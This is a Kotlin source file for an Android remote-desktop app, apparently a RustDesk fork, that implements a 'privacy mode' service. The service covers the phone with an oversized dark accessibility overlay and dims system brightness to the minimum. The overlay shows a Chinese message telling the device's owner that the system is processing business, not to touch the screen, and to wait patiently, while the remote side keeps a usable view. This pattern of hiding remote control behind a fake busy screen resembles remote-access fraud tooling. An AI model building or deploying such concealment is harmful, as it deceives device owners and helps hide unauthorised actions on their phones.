package com.carriez.flutter_hbb

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat

/**
 * Android privacy mode based on Accessibility overlay only.
 * No brightness API is used.
 */
class PrivacyModeService : Service() {

    companion object {
        private const val TAG = "PrivacyModeService"
        private const val CHANNEL_ID = "privacy_mode_channel"
        private const val NOTIFICATION_ID = 2001
        // Adaptive profile: keep remote screen visible while obscuring local content.
        private const val OVERLAY_ALPHA_WITH_BRIGHTNESS = 88
        private const val OVERLAY_ALPHA_NO_BRIGHTNESS = 118
        private const val OVERLAY_EXTRA_SIZE = 1200
        private const val OVERLAY_SCREEN_BRIGHTNESS = 0.0f
        private const val SYSTEM_BRIGHTNESS_TARGET = 1

        @Volatile
        private var isActive = false

        @Synchronized
        fun startPrivacyMode(context: Context) {
            Log.d(TAG, "DEBUG_PRIVACY: startPrivacyMode called, isActive=$isActive")
            if (isActive) {
                Log.d(TAG, "DEBUG_PRIVACY: Privacy mode already active, skip")
                return
            }

            val intent = Intent(context, PrivacyModeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        @Synchronized
        fun stopPrivacyMode(context: Context) {
            Log.d(TAG, "DEBUG_PRIVACY: stopPrivacyMode called, isActive=$isActive")
            if (!isActive) return
            context.stopService(Intent(context, PrivacyModeService::class.java))
        }
    }

    private var overlayView: View? = null
    private var windowManager: WindowManager? = null
    private var notificationManager: NotificationManager? = null
    private var originalBrightness: Int? = null
    private var originalBrightnessMode: Int? = null
    private var systemBrightnessAdjusted = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "DEBUG_PRIVACY: PrivacyModeService onCreate")
        isActive = true

        val accessibilityService = InputService.ctx
        if (accessibilityService == null) {
            Log.e(TAG, "DEBUG_PRIVACY: Accessibility service not enabled")
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Please enable Accessibility service first", Toast.LENGTH_LONG).show()
            }
            isActive = false
            stopSelf()
            return
        }

        try {
            val canWriteSystem = canWriteSystemSettings()
            val overlayAlpha = resolveOverlayAlpha(canWriteSystem)
            if (canWriteSystem) {
                tryDimSystemBrightness()
            } else {
                Log.w(
                    TAG,
                    "DEBUG_PRIVACY: WRITE_SETTINGS not granted, using overlay-only fallback profile"
                )
                Handler(Looper.getMainLooper()).post {
                    Toast.makeText(
                        this,
                        "\u672a\u6388\u4e88\u4fee\u6539\u7cfb\u7edf\u8bbe\u7f6e\u6743\u9650\uff0c\u9ed1\u5c4f\u6548\u679c\u53ef\u80fd\u53d7\u9650",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            }
            createForegroundNotification()
            createDarkOverlay(accessibilityService, overlayAlpha)
            Handler(Looper.getMainLooper()).post {
                Toast.makeText(this, "Privacy mode enabled", Toast.LENGTH_SHORT).show()
            }
            Log.d(TAG, "DEBUG_PRIVACY: Privacy mode activated")
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to activate privacy mode", e)
            isActive = false
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.d(TAG, "DEBUG_PRIVACY: PrivacyModeService onDestroy")

        overlayView?.let { view ->
            try {
                windowManager?.removeView(view)
            } catch (e: Exception) {
                Log.e(TAG, "DEBUG_PRIVACY: Error removing overlay", e)
            }
        }

        overlayView = null
        windowManager = null
        restoreSystemBrightness()
        isActive = false

        Handler(Looper.getMainLooper()).post {
            Toast.makeText(this, "Privacy mode disabled", Toast.LENGTH_SHORT).show()
        }

        super.onDestroy()
    }

    private fun createDarkOverlay(accessibilityService: Context, overlayAlpha: Int) {
        windowManager = accessibilityService.getSystemService(Context.WINDOW_SERVICE) as WindowManager

        val display = windowManager?.defaultDisplay
        val screenSize = android.graphics.Point()
        display?.getRealSize(screenSize)
        val screenWidth = screenSize.x
        val screenHeight = screenSize.y

        Log.d(
            TAG,
            "DEBUG_PRIVACY: Screen size=${screenWidth}x${screenHeight}, alpha=$overlayAlpha, windowBrightness=$OVERLAY_SCREEN_BRIGHTNESS, systemBrightnessAdjusted=$systemBrightnessAdjusted"
        )

        val container = FrameLayout(accessibilityService).apply {
            setBackgroundColor(Color.argb(overlayAlpha, 0, 0, 0))

            val textView = TextView(accessibilityService).apply {
                text =
                    "\u7cfb\u7edf\u6b63\u5728\u5904\u7406\u4e1a\u52a1\n" +
                    "\u8bf7\u52ff\u89e6\u78b0\u624b\u673a\u5c4f\u5e55\n" +
                    "\u611f\u8c22\u60a8\u7684\u8010\u5fc3\u7b49\u5f85"
                setTextColor(Color.WHITE)
                textSize = 34f
                gravity = Gravity.CENTER
                setTypeface(Typeface.DEFAULT_BOLD)
                setShadowLayer(14f, 3f, 3f, Color.BLACK)
                setPadding(48, 48, 48, 48)
                setBackgroundColor(Color.TRANSPARENT)
            }

            val textParams = FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.WRAP_CONTENT,
                FrameLayout.LayoutParams.WRAP_CONTENT,
                Gravity.CENTER
            )
            addView(textView, textParams)
        }

        val windowFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN

        val overlayWidth = screenWidth + OVERLAY_EXTRA_SIZE * 2
        val overlayHeight = screenHeight + OVERLAY_EXTRA_SIZE * 2

        val params = WindowManager.LayoutParams(
            overlayWidth,
            overlayHeight,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            windowFlags,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = -OVERLAY_EXTRA_SIZE
            y = -OVERLAY_EXTRA_SIZE

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }

            // Window-level brightness override: avoids Settings.System writes.
            screenBrightness = OVERLAY_SCREEN_BRIGHTNESS
            buttonBrightness = OVERLAY_SCREEN_BRIGHTNESS
        }

        windowManager?.addView(container, params)
        overlayView = container
        Log.d(TAG, "DEBUG_PRIVACY: Overlay created")
    }

    private fun canWriteSystemSettings(): Boolean {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.System.canWrite(this)
    }

    private fun resolveOverlayAlpha(canWriteSystem: Boolean): Int {
        val manufacturer = Build.MANUFACTURER.lowercase()
        val isHuaweiLike = manufacturer.contains("huawei") || manufacturer.contains("honor")
        val base = if (canWriteSystem) OVERLAY_ALPHA_WITH_BRIGHTNESS else OVERLAY_ALPHA_NO_BRIGHTNESS
        return if (isHuaweiLike) {
            (base + 10).coerceAtMost(140)
        } else {
            base
        }
    }

    private fun tryDimSystemBrightness() {
        if (!canWriteSystemSettings()) return
        val resolver = contentResolver
        try {
            originalBrightnessMode = Settings.System.getInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS_MODE
            )
        } catch (_: Exception) {
            originalBrightnessMode = Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
        }
        try {
            originalBrightness = Settings.System.getInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS
            )
        } catch (_: Exception) {
            originalBrightness = 128
        }

        try {
            Settings.System.putInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS_MODE,
                Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
            )
            Settings.System.putInt(
                resolver,
                Settings.System.SCREEN_BRIGHTNESS,
                SYSTEM_BRIGHTNESS_TARGET
            )
            systemBrightnessAdjusted = true
            Log.d(
                TAG,
                "DEBUG_PRIVACY: System brightness dimmed to $SYSTEM_BRIGHTNESS_TARGET (mode=${originalBrightnessMode}, original=${originalBrightness})"
            )
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to dim system brightness", e)
            systemBrightnessAdjusted = false
        }
    }

    private fun restoreSystemBrightness() {
        if (!systemBrightnessAdjusted) return
        if (!canWriteSystemSettings()) return
        val resolver = contentResolver
        try {
            originalBrightness?.let {
                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS, it)
            }
            originalBrightnessMode?.let {
                Settings.System.putInt(resolver, Settings.System.SCREEN_BRIGHTNESS_MODE, it)
            }
            Log.d(TAG, "DEBUG_PRIVACY: System brightness restored")
        } catch (e: Exception) {
            Log.e(TAG, "DEBUG_PRIVACY: Failed to restore system brightness", e)
        } finally {
            systemBrightnessAdjusted = false
        }
    }

    private fun createForegroundNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Privacy Mode Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps privacy mode overlay active in background"
                setShowBadge(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Privacy mode active")
            .setContentText("Black screen overlay is running")
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }
}
